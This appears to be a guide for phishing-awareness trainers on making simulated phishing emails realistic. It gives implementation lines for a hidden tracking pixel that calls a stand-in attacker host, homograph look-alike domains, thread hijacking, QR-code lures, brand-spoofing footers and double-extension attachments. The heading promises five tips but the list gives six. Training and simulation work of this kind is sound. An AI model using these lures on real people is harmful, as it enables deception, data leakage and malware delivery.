# Realism Guide: Enhancing Phishing & Spam Simulations

To make your phishing awareness training as effective as possible, your simulations should mimic the advanced tactics used by real-world threat actors. Here are 5 expert tips for maximum realism:

## 1. Pixel Tracking (Hidden Data Collection)
**The Tactic:** Embed a 1x1 invisible tracking pixel (a tiny transparent image) in the HTML body of the email.
- **Why it works:** Real attackers use this to "fingerprint" victims. When the email is opened, the image is requested from the attacker's server, leaking the user's IP address, device type, and the exact time the email was opened.
- **Implementation:** `<img src="https://attacker-analytics.com/track/user123.png" width="1" height="1" style="display:none;">`

## 2. Thread Hijacking (The "RE:" Trick)
**The Tactic:** Start your email subject with "RE:" or "FW:" and begin the body as if it's a continuation of a previous conversation.
- **Why it works:** Psychologically, users are much more likely to trust an email that appears to be part of an ongoing thread. It bypasses the "initial contact" skepticism that usually triggers a phishing warning.
- **Implementation:** `Subject: RE: Case #12941 - Update Required`

## 3. Grammatical "Consistency" (The Professional Flaw)
**The Tactic:** Avoid obvious spelling errors in the main pitch, but include a tiny, professional-looking "typo" in the footer or a legal disclaimer.
- **Why it works:** High-quality phishing now mimics corporate templates perfectly. A single missing comma in a 500-word disclaimer actually makes the email look *more* human and legitimate than a perfectly generated automated template.
- **Implementation:** `© 2026 Microsof Corporation. All right reserved.` (Note the missing 't' and 's')

## 4. Homograph Attacks (Unicode Deception)
**The Tactic:** Use Unicode characters (Cyrillic, Greek, etc.) that are visually identical to Latin ASCII characters.
- **Why it works:** To the human eye, `paypal.com` and `pаypal.com` (using a Cyrillic 'а') look identical. Many browsers and email clients will render the "look-alike" character, making the malicious link appear legitimate.
- **Implementation:** `https://xn--pypal-4ve.com` (renders as `pаypal.com`)

## 5. Quishing (QR Code Phishing)
**The Tactic:** Instead of a clickable text link, include a QR code for "Quick Verification" or "Mobile Login."
- **Why it works:** Users often scan QR codes on their mobile devices, where security protections are often weaker and URLs are harder to inspect. It also bypasses many email scanners that only look for text-based URLs.
- **Implementation:** Include an image of a QR code with the caption: "Scan to verify your identity on your mobile device."

## 6. Malicious Attachments (Payload Delivery)
**The Tactic:** Attach a file with a deceptive name or a double extension to bypass the user's initial suspicion.
- **Why it works:** Users often trust common file types like `.docx` or `.pdf`. Phishers use double extensions like `Invoice.pdf.exe` or `Salary_Adjustment.doc.zip` to hide the true nature of the file. In many email clients, the second extension is hidden, making the file look like a harmless document.
- **Implementation:** `Content-Disposition: attachment; filename="Bonus_Agreement.doc.exe"`
